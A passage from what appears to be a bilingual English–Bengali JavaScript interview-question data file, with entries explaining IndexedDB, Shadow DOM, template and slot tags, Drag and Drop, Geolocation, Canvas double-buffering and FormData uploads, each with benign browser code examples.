\`\`\``
  },
  {
    id: 'javascript-84',
    title: 'Explain the IndexedDB Native API and its asynchronous transactional design.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'IndexedDB', 'Databases', 'Browser API'],
    enAnswer: 'IndexedDB is a low-level browser object-store database supporting transactional reads/writes, indexing, and large binary storage asynchronously.',
    bnAnswer: 'IndexedDB হলো ব্রাউজারের লো-লেভেল অবজেক্ট-স্টোর ডাটাবেজ যা ট্রানজ্যাকশন-ভিত্তিক ডাটা রিড/রাইট ও বিশাল বাইনারি ডাটা স্টোর করতে পারে।',
    enExplanation: `### Explanation
Unlike \`localStorage\` which is small and synchronous, \`IndexedDB\` is a fully asynchronous database inside the browser:
- **Object Stores**: Holds JavaScript objects directly (no JSON serialization needed).
- **Transactional Design**: Every read or write must occur inside an explicit transaction block. If an operation fails, the transaction is rolled back automatically, preventing database corruption.
- **Asynchronous**: Functions do not return data; they return request objects. You must listen to \`onsuccess\` and \`onerror\` callbacks to receive results.

### Real-World Example
Building offline-first web editors. If you build a web-based video editor or document portal, you can store gigabytes of raw video files or offline documents directly inside the user's browser database safely.

### Best Practice
Wrap native IndexedDB calls inside promise wrappers, or use wrapper libraries (like Dexie.js) to avoid complex boilerplate event listener code.

### Common Mistakes
Forgetting that schema updates (like adding new object stores or indices) can only be performed inside the \`onupgradeneeded\` event handler, not during normal application transactions.

### Code Example
\`\`\`javascript
// Open database
const request = indexedDB.open("UserDatabase", 1);

request.onupgradeneeded = (event) => {
  const db = event.target.result;
  // Create object store with auto-incrementing key
  db.createObjectStore("users", { keyPath: "id", autoIncrement: true });
};

request.onsuccess = (event) => {
  const db = event.target.result;
  
  // Start transaction
  const transaction = db.transaction("users", "readwrite");
  const store = transaction.objectStore("users");
  
  // Add item
  const addRequest = store.add({ name: "Rohit", email: "r@test.com" });
  
  addRequest.onsuccess = () => {
    console.log("Data successfully added to IndexedDB!");
  };
};
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
\`localStorage\` অনেক ছোট এবং ব্লক-টাইপ হওয়ায় ব্রাউজারে বড় ডাটা রাখতে \`IndexedDB\` ডাটাবেজ ব্যবহৃত হয়:
- **অবজেক্ট স্টোর**: সরাসরি জাভাস্ক্রিপ্ট অবজেক্ট বা ফাইল সেভ করে (জেসন কনভার্সন লাগে না)।
- **ট্রানজ্যাকশনাল ডিজাইন**: প্রতিটি রিড/রাইট অপারেশন একটি ট্রানজ্যাকশন ব্লকের ভেতর চলে। কোনো ভুল হলে পুরো ব্লকটি রোল-ব্যাক (বাতিল) হয়ে ডাটার ইন্টিগ্রিটি বজায় রাখে।
- **অ্যাসিনক্রোনাস**: এটি সরাসরি ভ্যালু রিটার্ন করে না, বরং রিকোয়েস্ট অবজেক্ট দেয়। ডাটা পেতে আমাদের \`onsuccess\` এবং \`onerror\` লিসেনার ব্যবহার করতে হয়।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
অফলাইন-ফার্স্ট ভিডিও এডিটর বা ড্রাফট এডিটর তৈরি করা। ব্রাউজারের লোকাল মেমরিতে জিবি সাইজের ফাইল স্টোর করে রাখা, যাতে ইন্টারনেট ছাড়াই পেজ রিলোড করলেও ডাটা অ্যাক্সেস করা যায়।

### উত্তম অনুশীলন (Best Practice)
সহজে প্রমিজ হ্যান্ডেল করতে এবং বড় বড় ইভেন্ট বয়লারপ্লেট এড়াতে নেটিভ এপিআই সরাসরি ব্যবহার না করে Dexie.js লাইব্রেরি ব্যবহার করুন।

### সাধারণ ভুলসমূহ (Common Mistakes)
সাধারণ রিড/রাইট ট্রানজ্যাকশনের ভেতর ডাটাবেজ স্কিমা (নতুন টেবিল বা ইনডেক্স) মডিফাই করার চেষ্টা করা। এটি কেবল \`onupgradeneeded\` ইভেন্ট ব্লকের ভেতরেই করা সম্ভব।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
// ডাটাবেজ ওপেন করা হচ্ছে
const request = indexedDB.open("UserDatabase", 1);

request.onupgradeneeded = (event) => {
  const db = event.target.result;
  // অটো-ইনক্রিমেন্ট কি সমৃদ্ধ অবজেক্ট টেবিল তৈরি
  db.createObjectStore("users", { keyPath: "id", autoIncrement: true });
};

request.onsuccess = (event) => {
  const db = event.target.result;
  
  // ট্রানজ্যাকশন শুরু
  const transaction = db.transaction("users", "readwrite");
  const store = transaction.objectStore("users");
  
  // ডাটা যোগ করা হচ্ছে
  const addRequest = store.add({ name: "Rohit", email: "r@test.com" });
  
  addRequest.onsuccess = () => {
    console.log("IndexedDB তে ডাটা সফলভাবে সংরক্ষিত হয়েছে!");
  };
};
\`\`\``
  },
  {
    id: 'javascript-85',
    title: 'Explain Shadow DOM and Web Components encapsulation.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'Shadow DOM', 'Web Components', 'Encapsulation'],
    enAnswer: 'Shadow DOM provides encapsulation for HTML and CSS styles, blocking parent styles from leaking into custom elements and preventing element styling conflicts.',
    bnAnswer: 'Shadow DOM এইচটিএমএল ও সিএসএস স্টাইলের ইনক্যাপসুলেশন দেয়, যা প্যারেন্ট পেজের সিএসএস কোডকে কাস্টম উপাদানের ভেতর প্রবেশ করা থেকে আটকায়।',
    enExplanation: `### Explanation
Shadow DOM is a key pillar of Web Components standard:
- **Shadow Root**: A separate hidden DOM tree attached to a standard element.
- **CSS Isolation**: CSS rules written inside the Shadow DOM do not leak out, and global styles from the main page (except inherited properties like font-family or CSS variables) do not leak in.
- **DOM Encapsulation**: \`document.querySelector()\` will not find elements inside the shadow root unless accessed through \`element.shadowRoot\`.

### Real-World Example
Building a reusable widget like a payment form button or chat badge to be embedded across different client websites. Encapsulating it in Shadow DOM ensures the client's global stylesheet doesn't accidentally change the widget's buttons sizing or background colors.

### Best Practice
Leverage CSS Custom Properties (CSS variables) to define structured theme interfaces so consumers can safely stylize isolated shadow components.

### Common Mistakes
Forgetting that event target coordinates can shift. Events bubbling out of a Shadow DOM are retargeted, making the event look like it originated from the shadow host element itself.

### Code Example
\`\`\`javascript
// Define custom HTML element
class CustomBadge extends HTMLElement {
  constructor() {
    super();
    // Attach Shadow Root (mode open allows JS access via element.shadowRoot)
    const shadow = this.attachShadow({ mode: "open" });
    
    // Create encapsulated DOM structure and styles
    const container = document.createElement("span");
    container.textContent = "New Alert";
    
    const style = document.createElement("style");
    style.textContent = \`
      span {
        background: red;
        color: white;
        padding: 5px;
        border-radius: 3px;
      }
    \`;
    
    shadow.appendChild(style);
    shadow.appendChild(container);
  }
}

customElements.define("custom-badge", CustomBadge);
// Usage in HTML: <custom-badge></custom-badge>
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
Shadow DOM হলো ওয়েব কম্পোনেন্ট স্ট্যান্ডার্ডের একটি অন্যতম ভিত্তি:
- **শ্যাডো রুট (Shadow Root)**: এটি একটি সাধারণ ডম এলিমেন্টের সাথে সংযুক্ত আলাদা ও গোপন ডম ট্রি।
- **সিএসএস আইসোলেশন**: শ্যাডো ডমের ভেতরের সিএসএস রুলস বাইরে লিক হয় না, আবার বাইরের গ্লোবাল স্টাইলও (রুট সিএসএস ভ্যারিয়েবল ও ফন্ট বাদে) ভেতরে প্রবেশ করে ডম ভাঙতে পারে না।
- **ডম ইনক্যাপসুলেশন**: সাধারণ \`document.querySelector()\` দিয়ে শ্যাডো রুটের ভেতরের এলিমেন্ট খুঁজে পাওয়া যায় না, এটি সিকিউর থাকে।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
একটি চ্যাট প্লাগইন বা পেমেন্ট বাটন তৈরি করা যা বিভিন্ন কোম্পানির ওয়েবসাইটে এম্বেড করা হবে। শ্যাডো ডম ব্যবহার করলে ক্লায়েন্টের সাইটের সিএসএস স্টাইল আপনার প্লাগইনের বাটন ডিজাইন বা ব্যাকগ্রাউন্ড কালার পরিবর্তন করতে পারবে না।

### উত্তম অনুশীলন (Best Practice)
ব্যবহারকারীদের শ্যাডো ডমের ভেতর কাস্টমাইজেশন সুবিধা দিতে সিএসএস ভ্যারিয়েবল (CSS Variables) এক্সপোর্ট করুন, যাতে বাইরে থেকে থিমিং সেট করা যায়।

### সাধারণ ভুলসমূহ (Common Mistakes)
শ্যাডো ডমের ভেতর থেকে ফায়ার হওয়া ইভেন্টের সোর্স বা টার্গেট ঠিক রাখা। বাবল আপ হওয়ার সময় ইভেন্ট সোর্সটি মূল কম্পোনেন্টের নোডে রি-টার্গেট হয়ে যায়।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
// কাস্টম HTML এলিমেন্ট ক্লাস ডিফাইন
class CustomBadge extends HTMLElement {
  constructor() {
    super();
    // শ্যাডো রুট যুক্ত করা হলো (mode: open রাখলে JS দিয়ে রিড করা যায়)
    const shadow = this.attachShadow({ mode: "open" });
    
    // অবজেক্টের ডম এবং কাস্টম স্টাইলশীট তৈরি
    const container = document.createElement("span");
    container.textContent = "New Alert";
    
    const style = document.createElement("style");
    style.textContent = \`
      span {
        background: red;
        color: white;
        padding: 5px;
        border-radius: 3px;
      }
    \`;
    
    shadow.appendChild(style);
    shadow.appendChild(container);
  }
}

customElements.define("custom-badge", CustomBadge);
// HTML ফাইলে ব্যবহার: <custom-badge></custom-badge>
\`\`\``
  },
  {
    id: 'javascript-86',
    title: 'Explain the HTML5 template and slot tag specifications.',
    difficulty: 'intermediate',
    category: 'javascript',
    tags: ['JavaScript', 'HTML5 Template', 'Slots', 'Web Components'],
    enAnswer: 'The template tag holds HTML markup that is not rendered on load but can be cloned dynamically via JS. The slot tag serves as a placeholder to inject custom markup inside a Shadow DOM.',
    bnAnswer: 'template ট্যাগ এমন এইচটিএমএল মার্কআপ ধারণ করে যা লোড হওয়ার সময় রেন্ডার হয় না কিন্তু JS দিয়ে ক্লোন করা যায়। slot ট্যাগ ডাইনামিক ডাটা বসানোর প্লেসহোল্ডার।',
    enExplanation: `### Explanation
- **\`<template>\`**: The browser parses the template contents but stores it in a dormant state. No images are loaded, no scripts are executed until the template content is cloned and appended to the active DOM using \`document.importNode()\` or \`template.content.cloneNode(true)\`.
- **\`<slot>\`**: Used in Shadow DOM templates to allow users to pass custom markup from the main page context into the isolated widget.

### Real-World Example
Reusable modal templates. You write the modal structure and styling inside a \`<template>\` tag, cloning it dynamically whenever the user triggers a modal popup window, replacing values inside slots.

### Best Practice
Always set \`true\` as the parameter when cloning nodes (\`cloneNode(true)\`) to perform a deep clone of all child elements inside the template.

### Common Mistakes
Trying to directly query elements inside a template selector. You must query its \`.content\` document fragment instead (e.g. \`template.content.querySelector()\`).

### Code Example
\`\`\`html
<!-- HTML Definition -->
<template id="user-template">
  <div class="user-card">
    <h3><slot name="username">Default Name</slot></h3>
  </div>
</template>

<script>
  const template = document.getElementById("user-template");
  
  // Clone template content (deep copy)
  const clone = template.content.cloneNode(true);
  
  // Modify values if needed
  // Append to document body
  document.body.appendChild(clone);
</script>
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
- **\`<template>\`**: ব্রাউজার এই ট্যাগের ভেতরের কোড পার্স করে রাখলেও স্ক্রিনে রেন্ডার করে না। কন্টেন্টে থাকা ইমেজ বা স্ক্রিপ্ট ততক্ষণ লোড হয় না যতক্ষণ না একে জাভাস্ক্রিপ্ট দিয়ে ক্লোন করে ডমে অ্যাপেন্ড (\`cloneNode(true)\`) করা হয়।
- **\`<slot>\`**: শ্যাডো ডমের ভেতর কাস্টম ডাটা পাস করার প্লেসহোল্ডার। মেইন পেজ থেকে কম্পোনেন্ট ডিক্লেয়ার করার সময় স্লটে কাস্টম লেখা বা নোড ইনজেক্ট করা যায়।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
রিউজেবল মডাল বা পপআপ বক্স। মডালের কমন লেআউট ও সিএসএস স্টাইল \`<template>\` ট্যাগে ডিফাইন করে রাখা এবং ইউজার বাটন ক্লিক করা মাত্রই ফাইলটি ডাইনামিকালি ডমে স্ট্যাম্প করে কাস্টম স্লটে টাইটেল ও সাবটাইটেল বসানো।

### উত্তম অনুশীলন (Best Practice)
টেমপ্লেট ক্লোন করার সময় মেথডের ব্র্যাকেটে অবশ্যই \`true\` প্যারামিটার দিন (\`cloneNode(true)\`), যা নেস্টেড চাইল্ডসহ সম্পূর্ণ নোডগুলোকে ডিপ ক্লোন করে।

### সাধারণ ভুলসমূহ (Common Mistakes)
সরাসরি টেমপ্লেটের ওপর ডম কোয়েরি করার চেষ্টা করা। টেমপ্লেটের ভেতরের ডাটা রিড করতে তার ডিরেক্ট \`.content\` ফ্র্যাগমেন্টের ওপর কোয়েরি করতে হয় (যেমন \`template.content.querySelector()\`)।

### কোড উদাহরণ (Code Example)
\`\`\`html
<!-- HTML সংজ্ঞা -->
<template id="user-template">
  <div class="user-card">
    <h3><slot name="username">Default Name</slot></h3>
  </div>
</template>

<script>
  const template = document.getElementById("user-template");
  
  // টেমপ্লেট ক্লোন করা হচ্ছে (ডিপ কপি)
  const clone = template.content.cloneNode(true);
  
  // প্রয়োজন অনুযায়ী মান পরিবর্তন করে ডমে যুক্ত করা
  document.body.appendChild(clone);
</script>
\`\`\``
  },
  {
    id: 'javascript-87',
    title: 'Explain the HTML5 Drag and Drop API and DataTransfer object.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'Drag and Drop', 'DataTransfer', 'Browser API'],
    enAnswer: 'The Drag and Drop API allows elements to be dragged visually. The DataTransfer object manages the payload (text, files) transferred between drag source and drop target.',
    bnAnswer: 'Drag and Drop API এলিমেন্টগুলোকে ভিজ্যুয়ালি ড্র্যাগ করার সুবিধা দেয়। DataTransfer অবজেক্ট ড্র্যাগ সোর্স ও ড্রপ টার্গেটের মধ্যে স্থানান্তরিত ডাটা ম্যানেজ করে।',
    enExplanation: `### Explanation
- **Draggable Attribute**: Setting \`draggable="true"\` on any DOM element makes it draggable.
- **Drag Events**:
  - Source: \`dragstart\`, \`drag\`, \`dragend\`.
  - Target: \`dragenter\`, \`dragover\`, \`dragleave\`, \`drop\`.
- **\`DataTransfer\`**: Accessed via \`event.dataTransfer\`.
  - \`setData(format, data)\`: Stores payload at start.
  - \`getData(format)\`: Retrieves payload inside drop handler.
  - \`files\`: Contains file list if dropping files from the desktop.

### Real-World Example
Trello kanban boards or file upload drop-zones. When a user drags a file from their desktop onto a file drop-zone, the target's drop handler reads \`event.dataTransfer.files\` to parse and upload them.

### Best Practice
Always call \`event.preventDefault()\` inside the \`dragover\` event handler, otherwise the browser will block the \`drop\` event from triggering (default browser behavior blocks dropping).

### Common Mistakes
Forgetting that \`getData()\` is only accessible inside the \`drop\` event. Trying to read payload details during the \`dragover\` phase returns empty strings for security reasons.

### Code Example
\`\`\`javascript
const dragItem = document.getElementById("drag-item");
const dropZone = document.getElementById("drop-zone");

// 1. Drag Start (Set Data payload)
dragItem.addEventListener("dragstart", (e) => {
  e.dataTransfer.setData("text/plain", dragItem.id);
});

// 2. Drag Over (Required to allow dropping)
dropZone.addEventListener("dragover", (e) => {
  e.preventDefault(); // Prevents default block
});

// 3. Drop (Retrieve Data and Append)
dropZone.addEventListener("drop", (e) => {
  e.preventDefault();
  const id = e.dataTransfer.getData("text/plain");
  const element = document.getElementById(id);
  dropZone.appendChild(element); // Moves element visually
});
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
- **Draggable অ্যাট্রিবিউট**: যেকোনো DOM নোডের ওপর \`draggable="true"\` সেট করলে তা ভিজ্যুয়ালি ড্র্যাগ করা যায়।
- **ড্র্যাগ ইভেন্টসমূহ**:
  - সোর্স এলিমেন্ট ইভেন্ট: \`dragstart\`, \`drag\`, \`dragend\`।
  - ড্রপ টার্গেট ইভেন্ট: \`dragenter\`, \`dragover\`, \`dragleave\`, \`drop\`।
- **\`DataTransfer\`**: এটি \`event.dataTransfer\` দিয়ে রিড করা হয়।
  - \`setData(format, data)\`: শুরুতেই ডাটা পে-লোড সেভ করে।
  - \`getData(format)\`: ড্রপ হওয়ার পর ডাটা রিসিভ করে।
  - \`files\`: ডেস্কটপ থেকে ফাইল এনে ড্রপ করলে তার সম্পূর্ণ লিস্ট ধারণ করে।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
Trello-র মতো কানবান বোর্ড অথবা ফাইল আপলোড ড্রপ-জোন। ব্যবহারকারী ডেস্কটপ থেকে কোনো পিডিএফ ড্রপ-জোনে ছেড়ে দিলে, ড্রপ হ্যান্ডলার \`event.dataTransfer.files\` থেকে ফাইলটি রিড করে এপিআই-তে আপলোড করা শুরু করে।

### উত্তম অনুশীলন (Best Practice)
ড্রপ ইভেন্টটি সচল রাখতে অবশ্যই \`dragover\` ইভেন্ট হ্যান্ডলারে \`event.preventDefault()\` কল করুন, কারণ ব্রাউজারের ডিফল্ট আচরণ যেকোনো ড্রপ অপারেশনকে রিজেক্ট করে।

### সাধারণ ভুলসমূহ (Common Mistakes)
নিরাপত্তার স্বার্থে \`dragover\` লুপের ভেতর ডাটা রিড করার চেষ্টা করা। \`getData()\` মেথডটি কেবল মাত্র চূড়ান্ত \`drop\` ইভেন্টের ভেতরেই ডাটা রিড করার পারমিশন দেয়।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
const dragItem = document.getElementById("drag-item");
const dropZone = document.getElementById("drop-zone");

// ১. ড্র্যাগ স্টার্ট (ডাটা পে-লোড সেট করা হচ্ছে)
dragItem.addEventListener("dragstart", (e) => {
  e.dataTransfer.setData("text/plain", dragItem.id);
});

// ২. ড্র্যাগ ওভার (ড্রপ সক্রিয় করতে এটি রিকোয়ার্ড)
dropZone.addEventListener("dragover", (e) => {
  e.preventDefault(); // ব্রাউজারের ডিফল্ট ব্লক নিষ্ক্রিয় করবে
});

// ৩. ড্রপ (ডাটা রিসিভ ও এলিমেন্ট অ্যাপেন্ড)
dropZone.addEventListener("drop", (e) => {
  e.preventDefault();
  const id = e.dataTransfer.getData("text/plain");
  const element = document.getElementById(id);
  dropZone.appendChild(element); // নোডটিকে ভিজ্যুয়ালি স্থানান্তরিত করবে
});
\`\`\``
  },
  {
    id: 'javascript-88',
    title: 'Explain the Geolocation API and its permission flow.',
    difficulty: 'basic',
    category: 'javascript',
    tags: ['JavaScript', 'Geolocation API', 'Permissions', 'Browser API'],
    enAnswer: 'The Geolocation API retrieves the device\'s geographic position asynchronously, querying coordinates using getCurrentPosition or tracking location using watchPosition after permission approval.',
    bnAnswer: 'Geolocation API ডিভাইসটির ভৌগোলিক অবস্থান অ্যাসিনক্রোনাসলি নিয়ে আসে। এটিgetCurrentPosition বা watchPosition দিয়ে কোঅর্ডিনেট ট্র্যাক করে।',
    enExplanation: `### Explanation
- **Methods**:
  - \`navigator.geolocation.getCurrentPosition(success, error, options)\`: One-time query of lat/lng coordinates.
  - \`navigator.geolocation.watchPosition(success, error, options)\`: Periodically fires callback whenever the device's physical coordinates change.
- **Permission Flow**: Secure origin (HTTPS) is mandatory. The browser automatically handles displaying the permission popup window when the API is invoked.
- **Options**: Configure \`enableHighAccuracy: true\`, \`timeout\`, and \`maximumAge\` (cache settings).

### Real-World Example
Food delivery or ride-sharing apps (like Uber or Pathao). The app uses \`watchPosition\` to track the real-time driver coordinates on a map and update distance metrics continuously.

### Best Practice
Always handle permission rejection errors cleanly inside the error callback to explain to the user why the service needs location tracking to work.

### Common Mistakes
Forgetting that GPS tracking consumes significant battery resources. Always call \`navigator.geolocation.clearWatch(watchId)\` to stop tracking when the app process completes or the component unmounts.

### Code Example
\`\`\`javascript
const options = {
  enableHighAccuracy: true, // Use GPS if available
  timeout: 5000,
  maximumAge: 0 // Do not use cached location
};

function success(pos) {
  const crd = pos.coords;
  console.log("Latitude:", crd.latitude);
  console.log("Longitude:", crd.longitude);
  console.log("Accuracy:", crd.accuracy + " meters");
}

function error(err) {
  console.warn(\`Error(\${err.code}): \${err.message}\`);
}

// Request Location
if ("geolocation" in navigator) {
  navigator.geolocation.getCurrentPosition(success, error, options);
}
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
- **মেথডসমূহ**:
  - \`navigator.geolocation.getCurrentPosition()\`: একবারের জন্য ল্যাটিটিউড/লঙ্গিটিউড কোঅর্ডিনেট রিড করে।
  - \`navigator.geolocation.watchPosition()\`: ডিভাইসের অবস্থান পরিবর্তিত হলে স্বয়ংক্রিয়ভাবে বারবার কলব্যাক ইভেন্ট ফায়ার করে।
- **পারমিশন ফ্লো**: সুরক্ষার স্বার্থে কেবল HTTPS বা সুরক্ষিত লিঙ্কে এটি কাজ করে। ব্রাউজার নিজে থেকেই পারমিশন পপআপ শো করে।
- **অপশনস**: জিপিএস সচল করতে \`enableHighAccuracy: true\` এবং ক্যাশ এড়াতে \`maximumAge\` কনফিগার করা যায়।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
রাইড-শেয়ারিং বা ফুড ডেলিভারি অ্যাপ (যেমন: রাইডার ট্র্যাকিং)। \`watchPosition\` ব্যবহার করে অনবরত রাইডারের অবস্থান ট্র্যাক করা এবং ম্যাপে তার পজিশন রেন্ডার করা।

### উত্তম অনুশীলন (Best Practice)
ইউজার পারমিশন ডিনাই (রিজেক্ট) করলে ক্যাচ ব্লকে এরর কোড চেক করে ইউজারকে স্পষ্টভাবে জানান কেন সার্ভিসটি রান করতে লোকেশন ডাটা প্রয়োজন।

### সাধারণ ভুলসমূহ (Common Mistakes)
জিপিএস মনিটরিংয়ে ব্যাটারির ব্যপক অপচয় হয় তা ভুলে যাওয়া। কাজ শেষে বা রাউট পরিবর্তন হলে অবশ্যই \`navigator.geolocation.clearWatch(watchId)\` দিয়ে ট্র্যাকিং বন্ধ করুন।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
const options = {
  enableHighAccuracy: true, // জিপিএস থাকলে তা ব্যবহার করবে
  timeout: 5000,
  maximumAge: 0 // ক্যাশ করা লোকেশন নিবে না
};

function success(pos) {
  const crd = pos.coords;
  console.log("অক্ষাংশ:", crd.latitude);
  console.log("দ্রাঘিমাংশ:", crd.longitude);
  console.log("নির্ভুলতা:", crd.accuracy + " মিটার");
}

function error(err) {
  console.warn(\`Error(\${err.code}): \${err.message}\`);
}

// লোকেশন রিকোয়েস্ট করা হচ্ছে
if ("geolocation" in navigator) {
  navigator.geolocation.getCurrentPosition(success, error, options);
}
\`\`\``
  },
  {
    id: 'javascript-89',
    title: 'Explain Canvas API operations and double-buffering.',
    difficulty: 'advanced',
    category: 'javascript',
    tags: ['JavaScript', 'Canvas API', '2D Context', 'Graphics'],
    enAnswer: 'The Canvas API draws 2D graphics programmatically. Double-buffering draws shapes on an offscreen canvas first, swapping them onto the active screen canvas to prevent rendering flicker.',
    bnAnswer: 'Canvas API প্রোগ্রামের মাধ্যমে ২ডি গ্রাফিক্স আঁকার সুবিধা দেয়। ডাবল-বাফারিং অফস্ক্রিন ক্যানভাসে প্রথমে ছবি এঁকে পরে মূল স্ক্রিনে সোয়াপ করে ফ্লিকার রোধ করে।',
    enExplanation: `### Explanation
- **Canvas API**: Render bitmaps dynamically via JavaScript using a \`<canvas>\` element and drawing context (\`ctx = canvas.getContext('2d')\`).
- **Flicker Problem**: When redrawing complex frames rapidly, clearing the canvas and drawing shapes one-by-one results in half-rendered frames displaying briefly, causing visual flicker.
- **Double-Buffering**:
  1. Create an offscreen canvas dynamically in memory: \`document.createElement('canvas')\`.
  2. Perform all clearing and complex drawings on the offscreen context.
  3. Draw the offscreen canvas onto the active visible canvas in a single step: \`ctx.drawImage(offscreenCanvas, 0, 0)\`.

### Real-World Example
HTML5 2D games or real-time data plotting dashboards. Using double-buffering ensures that when hundreds of data points redraw every frame, the graph remains smooth without flashing blank white states.

### Best Practice
Always scale the canvas coordinate buffer to match the device's physical screen pixel ratio (\`window.devicePixelRatio\`) to prevent blurry rendering on high-DPI screens.

### Common Mistakes
Clearing and drawing directly on the visible canvas for highly complex animations, which causes visual stuttering and high render CPU cycles.

### Code Example
\`\`\`javascript
const visibleCanvas = document.getElementById("game-canvas");
const visibleCtx = visibleCanvas.getContext("2d");

// Create Offscreen Canvas (Double-Buffering)
const offscreenCanvas = document.createElement("canvas");
offscreenCanvas.width = visibleCanvas.width;
offscreenCanvas.height = visibleCanvas.height;
const offscreenCtx = offscreenCanvas.getContext("2d");

function drawFrame() {
  // 1. Draw everything on offscreen canvas context
  offscreenCtx.clearRect(0, 0, offscreenCanvas.width, offscreenCanvas.height);
  
  offscreenCtx.fillStyle = "blue";
  offscreenCtx.fillRect(50, 50, 100, 100); // Complex drawing
  
  // 2. Draw offscreen canvas onto visible screen in one step
  visibleCtx.clearRect(0, 0, visibleCanvas.width, visibleCanvas.height);
  visibleCtx.drawImage(offscreenCanvas, 0, 0);
  
  requestAnimationFrame(drawFrame);
}

requestAnimationFrame(drawFrame);
\`\`\``,
    bnExplanation: `### ব্যাখ্যা (Explanation)
- **Canvas API**: \`<canvas>\` নোড এবং ড্রয়িং কনটেক্সট (\`getContext('2d')\`) ব্যবহার করে সরাসরি জাভাস্ক্রিপ্ট কোড দিয়ে গ্রাফিক্স আঁকা।
- **ফ্লিকার সমস্যা**: গেম বা অ্যানিমেশনের প্রতিটি ফ্রেমে আগের ডিজাইন ক্লিয়ার করে নতুন করে আঁকার সময় স্ক্রিন কাঁপতে বা ফ্লিকার করতে পারে, যা দেখতে দৃষ্টিকটু।
- **ডাবল-বাফারিং (Double-Buffering)**:
  ১. মেমরিতে একটি ইন-মেমরি অফস্ক্রিন ক্যানভাস তৈরি করা: \`document.createElement('canvas')\`।
  ২. অফস্ক্রিন ক্যানভাসে প্রথমে সব ড্রয়িং ও ক্লিয়ার অপারেশন সম্পন্ন করা।
  ৩. একটি মাত্র কমান্ডে অফস্ক্রিন ক্যানভাসটিকে মূল ভিজ্যুয়াল ক্যানভাসে এঁকে দেওয়া: \`ctx.drawImage(offscreenCanvas, 0, 0)\`।

### বাস্তব-ভিত্তিক উদাহরণ (Real-World Example)
এইচটিএমএল-৫ গেম বা কাস্টম গ্রাফ চার্ট ড্যাশবোর্ড। ডাবল-বাফারিং ব্যবহার করলে প্রতি সেকেন্ডে ৬০ বার সম্পূর্ণ চার্টটি রি-ড্র করা হলেও গ্রাফের ট্রানজ্যাকশনগুলো স্মুথ দেখায়, ব্ল্যাংক ফ্রেম ফ্ল্যাশ হয় না।

### উত্তম অনুশীলন (Best Practice)
হাই-রেজোলিউশন বা রেটিনা স্ক্রিনে ক্যানভাস যাতে ব্লার বা ঘোলা না দেখায় সেজন্য ক্যানভাসের সাইজ ডিভাইসের ফিজিক্যাল পিক্সেল রেশিও (\`window.devicePixelRatio\`) দিয়ে গুণ করে রি-স্কেল করে নিন।

### সাধারণ ভুলসমূহ (Common Mistakes)
অত্যন্ত জটিল গ্রাফিক্স রেন্ডার করার সময় সরাসরি মেইন ভিজ্যুয়াল স্ক্রিনে ক্লিয়ার ও ড্রয়িং লুপ চালানো, যা ইউআই রেন্ডার স্লো করে দেয়।

### কোড উদাহরণ (Code Example)
\`\`\`javascript
const visibleCanvas = document.getElementById("game-canvas");
const visibleCtx = visibleCanvas.getContext("2d");

// অফস্ক্রিন ক্যানভাস তৈরি (ডাবল-বাফারিং)
const offscreenCanvas = document.createElement("canvas");
offscreenCanvas.width = visibleCanvas.width;
offscreenCanvas.height = visibleCanvas.height;
const offscreenCtx = offscreenCanvas.getContext("2d");

function drawFrame() {
  // ১. অফস্ক্রিন ক্যানভাসে ড্রয়িং সম্পন্ন করা হচ্ছে
  offscreenCtx.clearRect(0, 0, offscreenCanvas.width, offscreenCanvas.height);
  
  offscreenCtx.fillStyle = "blue";
  offscreenCtx.fillRect(50, 50, 100, 100); // কাস্টম ড্রয়িং
  
  // ২. একবারে পুরো অফস্ক্রিন ক্যানভাসটি মেইন স্ক্রিনে এঁকে দেওয়া হলো
  visibleCtx.clearRect(0, 0, visibleCanvas.width, visibleCanvas.height);
  visibleCtx.drawImage(offscreenCanvas, 0, 0);
  
  requestAnimationFrame(drawFrame);
}

requestAnimationFrame(drawFrame);
\`\`\``
  },
  {
    id: 'javascript-90',
    title: 'Explain FormData serialization and file uploads.',
    difficulty: 'basic',
    category: 'javascript',
    tags: ['JavaScript', 'FormData', 'File Uploads', 'HTTP'],
    enAnswer: 'FormData automatically compiles form fields and files into a multipart/form-data payload, handling boundaries and encoding automatically for HTTP submissions.',
    bnAnswer: 'FormData স্বয়ংক্রিয়ভাবে ফর্মের ফিল্ড ও ফাইলগুলোকে একটি multipart/form-data পে-লোডে কম্পাইল করে আপলোডের বাউন্ডারি ও এনকোডিং নির্ধারণ করে।',
    enExplanation: `### Explanation
- **\`FormData(formElement)\`**: Instantiates an object capturing all active input key-values from the target HTML form.
- **Multipart Payload**: Essential when uploading binary files alongside text fields. The browser automatically configures the \`Content-Type\` header to \`multipart/form-data\` along with a unique boundary string delimiter.
- **Methods**: Supports \`append(key, value)\`, \`set(key, value)\`, and \`delete(key)\` to alter payloads dynamically.

### Real-World Example
Uploading a profile image with user registration details. You construct a \`FormData\` instance, append the file binary captured from the input element, and send it directly via \`fetch\` or \`axios\`.

### Best Practice
Never set the \`Content-Type\` header manually when sending \`FormData\` via \`fetch\`. Letting the browser set it automatically ensures the unique multipart boundary delimiter is appended correctly.

### Common Mistakes
Trying to stringify FormData via \`JSON.stringify(formData)\`. It does not convert to JSON directly; it must be sent as the raw body parameter in the fetch config.

### Code Example
\`\`\`javascript
// HTML Form submission interceptor
const form = document.querySelector("#user-form");

form.addEventListener("submit", async (e) => {
  e.preventDefault();
  
  // Instantiates from form elements automatically
  const formData = new FormData(form);
  
  // Dynamically append extra parameter (e.g. tracking token)
  formData.append("source", "web_app");
  
  try {
    const response = await fetch("/api/register", {
      method: "POST",
      body: formData // Browser sets Content-Type to multipart/form-data automatically!
    });
